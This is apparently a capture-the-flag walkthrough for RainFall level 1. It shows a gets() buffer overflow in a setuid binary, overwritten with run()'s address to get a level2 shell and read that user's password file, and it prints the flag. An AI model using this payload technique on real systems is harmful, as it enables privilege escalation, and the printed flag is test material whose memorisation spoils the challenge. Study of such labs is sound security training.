# 🧩 Level 1 - Walkthrough

## 📄 Listing Files

```bash
level1@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level2 users 5138 Mar  6  2016 level1
level1@RainFall:~$
```

- 🔍 The directory contains an executable file: level1.

## 🧪 Testing the Program
```bash
level1@RainFall:~$ ./level1
a
level1@RainFall:~$ ./level1 test
423
level1@RainFall:~$
```
- The program waits for input and exits after pressing Enter.
- It does not crash, but just prints some numbers.

## 🐞 Static Analysis in GDB
- The binary contains two main functions: main and run.
- The run function:
- - Uses fwrite to display:
``` scss
Good... Wait what?
```
- - Then executes /bin/sh using system.
- The main function:
- - Uses gets() for user input, which is vulnerable to buffer overflow.

## 💣 Buffer Overflow Exploit
👉 The idea: Overwrite the return address (RET) in main() to jump to run().

## 🎯 Find EIP Offset
```bash
level1@RainFall:~$ python -c 'print "a" * 80' > /tmp/exploit
level1@RainFall:~$ gdb ./level1
(gdb) r < /tmp/exploit
Starting program: /home/user/level1/level1 < /tmp/exploit

Program received signal SIGSEGV, Segmentation fault.
0x61616161 in ?? ()
```

## 🛠️ Build the Exploit Payload
- Padding: "a" * 76
- Address of run(): 0x08048444 (little-endian: \x44\x84\x04\x08)
```bash
level1@RainFall:~$ python -c 'print "a" * 76 + "\\x44\\x84\\x04\\x08"' > /tmp/exploit
level1@RainFall:~$ cat /tmp/exploit | ./level1
Good... Wait what?
Segmentation fault (core dumped)
```
- 😬 The shell exits immediately because it's non-interactive.

## 🪄 Trick to Keep Shell Open
Use cat /tmp/exploit - to keep stdin open:
```bash
level1@RainFall:~$ cat /tmp/exploit - | ./level1
Good... Wait what?
whoami
level2
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
^C
Segmentation fault (core dumped)
```
🎉 Success! Logged in as level2.

## 🔐 Switching User
```bash
level1@RainFall:~$ su level2
Password:
...
level2@RainFall:~$
```

## ✅ Level 1 Passed!
```
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```
- 🎉 Done!